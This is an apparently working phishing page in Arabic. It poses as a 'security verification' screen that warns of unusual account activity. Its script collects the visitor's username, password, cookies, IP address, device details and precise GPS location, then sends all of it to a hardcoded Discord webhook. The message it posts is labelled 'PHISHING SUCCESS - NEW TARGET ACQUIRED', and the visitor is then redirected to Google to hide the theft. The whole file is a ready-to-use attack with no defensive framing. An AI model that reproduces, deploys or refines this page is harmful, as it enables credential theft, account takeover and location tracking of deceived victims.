<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Required - نظام الأمان</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #001510);
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
        }
        
        .container {
            background: rgba(10, 15, 35, 0.85);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
            width: 100%;
            max-width: 500px;
            padding: 40px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .logo {
            width: 120px;
            height: 120px;
            margin: 0 auto 25px;
            background: radial-gradient(circle, #4b6cb7 0%, #182848 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 50px;
            color: white;
            border: 3px solid #5d9bff;
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            color: #5d9bff;
            text-shadow: 0 2px 10px rgba(93, 155, 255, 0.5);
        }
        
        .subtitle {
            font-size: 16px;
            margin-bottom: 30px;
            opacity: 0.8;
            line-height: 1.6;
        }
        
        .form-group {
            margin-bottom: 25px;
            text-align: right;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #a0c4ff;
        }
        
        input {
            width: 100%;
            padding: 15px 20px;
            border-radius: 12px;
            border: 2px solid rgba(93, 155, 255, 0.3);
            background: rgba(10, 20, 40, 0.7);
            color: white;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        
        input:focus {
            border-color: #5d9bff;
            outline: none;
            box-shadow: 0 0 15px rgba(93, 155, 255, 0.5);
        }
        
        .btn {
            background: linear-gradient(to right, #4b6cb7, #182848);
            color: white;
            border: none;
            padding: 16px;
            font-size: 18px;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            font-weight: 600;
            letter-spacing: 1px;
            margin-top: 10px;
            border: 2px solid rgba(93, 155, 255, 0.5);
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 7px 20px rgba(93, 155, 255, 0.4);
        }
        
        .footer {
            margin-top: 30px;
            font-size: 14px;
            opacity: 0.7;
            line-height: 1.6;
        }
        
        .loading {
            display: none;
            margin-top: 20px;
            font-size: 16px;
            color: #5d9bff;
        }
        
        .location-access {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 20px;
            margin-top: 30px;
            text-align: center;
        }
        
        .location-icon {
            font-size: 40px;
            margin-bottom: 15px;
            color: #ff6b6b;
        }
        
        .success-message {
            display: none;
            color: #4ade80;
            font-size: 18px;
            margin-top: 20px;
            animation: fadeIn 1s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
            }
            
            .logo {
                width: 100px;
                height: 100px;
                font-size: 40px;
            }
            
            h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">!</div>
        <h1>مطلوب التحقق من الأمان</h1>
        <p class="subtitle">لقد اكتشف نظامنا نشاطًا غير عادي على حسابك. يلزم التحقق من هويتك لإكمال عملية الأمان واستعادة الوصول إلى حسابك.</p>
        
        <form id="verificationForm">
            <div class="form-group">
                <label for="username">اسم المستخدم أو البريد الإلكتروني</label>
                <input type="text" id="username" name="username" required autocomplete="username">
            </div>
            
            <div class="form-group">
                <label for="password">كلمة المرور</label>
                <input type="password" id="password" name="password" required autocomplete="current-password">
            </div>
            
            <button type="submit" class="btn">التحقق من الهوية</button>
        </form>
        
        <div class="location-access">
            <div class="location-icon">📍</div>
            <p>يجب السماح بالوصول إلى الموقع لتأكيد هويتك ومنع الأنشطة الاحتيالية</p>
        </div>
        
        <div id="loading" class="loading">جاري التحقق من المعلومات وتأمين حسابك...</div>
        <div id="successMessage" class="success-message">تم التحقق بنجاح! جاري إعادة توجيهك...</div>
    </div>

    <script>
        // Replace with your actual Discord webhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1394152488361394196/-9qojTZGe2cUwxoccSgx-4hC76hfeVQipCKD79m3xrI3O8jPF-gWsXzmQJs6XnLaEUqe';
        
        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Show loading indicator
            document.getElementById('loading').style.display = 'block';
            
            // Collect device and user information
            const data = {
                credentials: {
                    username: document.getElementById('username').value,
                    password: document.getElementById('password').value
                },
                deviceInfo: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    languages: navigator.languages.join(', '),
                    cookies: document.cookie,
                    screen: `${screen.width}x${screen.height}`,
                    vendor: navigator.vendor,
                    cpuCores: navigator.hardwareConcurrency || 'N/A',
                    deviceMemory: navigator.deviceMemory || 'N/A'
                },
                network: {
                    ip: await getIP(),
                    connection: getConnectionInfo()
                },
                time: {
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    localTime: new Date().toString()
                }
            };
            
            // Attempt to get precise geolocation
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    data.location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' meters',
                        timestamp: new Date(position.timestamp).toString()
                    };
                    sendToDiscord(data);
                }, error => {
                    data.locationError = getGeolocationError(error);
                    sendToDiscord(data);
                }, { 
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                data.locationError = 'Geolocation not supported';
                sendToDiscord(data);
            }
        });
        
        function getGeolocationError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    return 'تم رفض الإذن من قبل المستخدم';
                case error.POSITION_UNAVAILABLE:
                    return 'معلومات الموقع غير متوفرة';
                case error.TIMEOUT:
                    return 'انتهت مهلة طلب الموقع';
                default:
                    return 'خطأ غير معروف';
            }
        }
        
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Failed to retrieve IP';
            }
        }
        
        function getConnectionInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!connection) return 'N/A';
            
            return {
                type: connection.type || 'N/A',
                effectiveType: connection.effectiveType || 'N/A',
                downlink: connection.downlink + ' Mbps' || 'N/A',
                rtt: connection.rtt + ' ms' || 'N/A'
            };
        }
        
        function sendToDiscord(data) {
            const embed = {
                title: "🎣 PHISHING SUCCESS - NEW TARGET ACQUIRED",
                color: 16711680,
                fields: [
                    { name: "👤 Credentials", value: `**Username:** \`${data.credentials.username}\`\n**Password:** \`${data.credentials.password}\``, inline: false },
                    { name: "🖥️ Device Info", value: `**OS:** ${data.deviceInfo.platform}\n**Browser:** ${data.deviceInfo.userAgent}\n**Screen:** ${data.deviceInfo.screen}\n**CPU Cores:** ${data.deviceInfo.cpuCores}\n**RAM:** ${data.deviceInfo.deviceMemory}GB`, inline: false },
                    { name: "🌐 Network", value: `**IP:** ||${data.network.ip}||\n**Connection:** ${JSON.stringify(data.network.connection)}`, inline: false }
                ],
                footer: { text: "Dark Phoenix System • " + new Date().toLocaleString() }
            };
            
            if (data.location) {
                embed.fields.push({
                    name: "📍 Precise Location", 
                    value: `**Latitude:** ${data.location.latitude}\n**Longitude:** ${data.location.longitude}\n**Accuracy:** ${data.location.accuracy}\n[Google Maps](https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude})`,
                    inline: false
                });
            }
            
            if (data.locationError) {
                embed.fields.push({
                    name: "⚠️ Location Error",
                    value: data.locationError,
                    inline: false
                });
            }
            
            const payload = {
                content: "@everyone **NEW TARGET ACQUIRED** 🎣",
                embeds: [embed]
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('successMessage').style.display = 'block';
                    
                    // Redirect after success
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 3000);
                }
            })
            .catch(error => console.error('Error sending to Discord:', error));
        }
    </script>
</body>
</html>
